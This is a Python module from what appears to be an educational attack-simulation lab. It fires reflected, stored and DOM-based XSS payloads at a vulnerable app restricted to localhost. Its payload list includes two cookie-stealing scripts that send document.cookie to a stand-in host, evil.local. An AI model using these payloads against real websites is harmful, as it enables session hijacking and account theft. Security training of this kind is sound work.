"""
CyberSim6 - XSS Attack Module
Tests Reflected, Stored, and DOM-based XSS against the vulnerable app.
EDUCATIONAL PURPOSE ONLY.
"""

from __future__ import annotations

import time
from typing import Any

import requests as http_requests

from cybersim.core.base_module import BaseModule
from cybersim.core.safety import validate_url_localhost


XSS_PAYLOADS = {
    "reflected": [
        ("<script>alert('XSS')</script>", "Basic script injection"),
        ("<img src=x onerror=alert('XSS')>", "IMG onerror handler"),
        ("<svg onload=alert('XSS')>", "SVG onload handler"),
        ("'\"><script>alert('XSS')</script>", "Quote escape + script"),
        ("<body onload=alert('XSS')>", "Body onload"),
        ("<iframe src='javascript:alert(1)'>", "Iframe javascript URI"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus"),
        ("javascript:alert('XSS')//", "Javascript protocol"),
    ],
    "stored": [
        ("<script>document.location='http://evil.local/?c='+document.cookie</script>", "Cookie theft"),
        ("<img src=x onerror='fetch(\"http://evil.local/\"+document.cookie)'>", "Fetch-based exfiltration"),
        ("<div onmouseover=alert('XSS')>Hover me</div>", "Event handler injection"),
        ("<a href='javascript:alert(1)'>Click me</a>", "Javascript href"),
    ],
    "dom": [
        ("<img src=x onerror=alert('DOM-XSS')>", "DOM-based IMG injection"),
        ("<script>alert('DOM')</script>", "DOM-based script injection"),
        ("<svg/onload=alert('DOM')>", "DOM-based SVG injection"),
    ],
}


class XSSAttack(BaseModule):
    """XSS attack simulation with multiple techniques."""

    MODULE_TYPE = "attack"
    MODULE_NAME = "xss_attack"

    def _validate_safety(self) -> None:
        base_url = self.config.get("target_url", "http://127.0.0.1:8082")
        validate_url_localhost(base_url)

    def run(self, target_url: str | None = None, attack_type: str = "all", **kwargs: Any) -> dict[str, Any]:
        """
        Run XSS attacks against the vulnerable app.

        Args:
            target_url: Base URL of vulnerable app
            attack_type: reflected, stored, dom, or all
        """
        base_url = target_url or self.config.get("target_url", "http://127.0.0.1:8082")
        validate_url_localhost(base_url)

        self._running = True
        self.log_event("attack_started", {
            "message": f"XSS attack started on {base_url} (type: {attack_type})",
            "target": base_url,
            "attack_type": attack_type,
            "status": "warning",
        })

        results: dict[str, Any] = {"total": 0, "injected": 0, "findings": []}

        if attack_type in ("reflected", "all"):
            self._test_reflected_xss(base_url, results)

        if attack_type in ("stored", "all"):
            self._test_stored_xss(base_url, results)

        if attack_type in ("dom", "all"):
            self._test_dom_xss(base_url, results)

        self._running = False
        self.log_event("attack_completed", {
            "message": f"XSS attack completed. {results['injected']}/{results['total']} payloads injected.",
            "total_payloads": results["total"],
            "injected": results["injected"],
            "findings_count": len(results["findings"]),
            "status": "info",
        })
        return results

    def _test_reflected_xss(self, base_url: str, results: dict[str, Any]) -> None:
        """Test reflected XSS on search and error endpoints."""
        self.log_event("phase_started", {
            "message": "Testing Reflected XSS...",
            "phase": "reflected",
            "status": "info",
        })

        endpoints = [
            ("/search", "q"),
            ("/error", "msg"),
        ]

        for endpoint, param in endpoints:
            for payload, description in XSS_PAYLOADS["reflected"]:
                if not self._running:
                    return
                results["total"] += 1

                try:
                    resp = http_requests.get(
                        f"{base_url}{endpoint}",
                        params={param: payload},
                        timeout=5,
                    )

                    # Check if payload is reflected unescaped
                    if payload in resp.text:
                        results["injected"] += 1
                        results["findings"].append({
                            "type": "reflected",
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "description": description,
                        })
                        self.log_event("xss_success", {
                            "message": f"Reflected XSS on {endpoint}?{param}: {description}",
                            "payload": payload,
                            "endpoint": endpoint,
                            "technique": "reflected",
                            "status": "warning",
                        })

                except http_requests.RequestException as e:
                    self.log_event("error", {"message": str(e), "status": "error"})
                time.sleep(0.05)

    def _test_stored_xss(self, base_url: str, results: dict[str, Any]) -> None:
        """Test stored XSS via guestbook comments."""
        self.log_event("phase_started", {
            "message": "Testing Stored XSS...",
            "phase": "stored",
            "status": "info",
        })

        for payload, description in XSS_PAYLOADS["stored"]:
            if not self._running:
                return
            results["total"] += 1

            try:
                # Post the malicious comment
                http_requests.post(
                    f"{base_url}/comment",
                    data={"name": "XSS-Tester", "message": payload},
                    timeout=5,
                    allow_redirects=False,
                )

                # Check if it's stored and rendered
                resp = http_requests.get(f"{base_url}/guestbook", timeout=5)
                if payload in resp.text:
                    results["injected"] += 1
                    results["findings"].append({
                        "type": "stored",
                        "endpoint": "/comment -> /guestbook",
                        "payload": payload,
                        "description": description,
                    })
                    self.log_event("xss_success", {
                        "message": f"Stored XSS confirmed: {description}",
                        "payload": payload,
                        "technique": "stored",
                        "status": "warning",
                    })

            except http_requests.RequestException as e:
                self.log_event("error", {"message": str(e), "status": "error"})
            time.sleep(0.05)

    def _test_dom_xss(self, base_url: str, results: dict[str, Any]) -> None:
        """Test DOM-based XSS (note: full verification requires a browser)."""
        self.log_event("phase_started", {
            "message": "Testing DOM-based XSS (server-side check only)...",
            "phase": "dom",
            "status": "info",
        })

        for payload, description in XSS_PAYLOADS["dom"]:
            if not self._running:
                return
            results["total"] += 1

            try:
                # DOM XSS is client-side; we check if the page serves the vulnerable JS
                resp = http_requests.get(f"{base_url}/dom", timeout=5)

                if "innerHTML" in resp.text and "decodeURIComponent" in resp.text:
                    results["injected"] += 1
                    results["findings"].append({
                        "type": "dom",
                        "endpoint": "/dom",
                        "payload": payload,
                        "description": description,
                        "note": "DOM XSS - requires browser to execute. Vulnerable JS pattern confirmed.",
                    })
                    self.log_event("xss_success", {
                        "message": f"DOM XSS pattern found: innerHTML + decodeURIComponent (payload: {description})",
                        "payload": payload,
                        "technique": "dom",
                        "status": "warning",
                    })
                    break  # Only need to confirm once

            except http_requests.RequestException as e:
                self.log_event("error", {"message": str(e), "status": "error"})

    def stop(self) -> None:
        self._running = False
        self.log_event("attack_stopped", {
            "message": "XSS attack stopped.",
            "status": "info",
        })
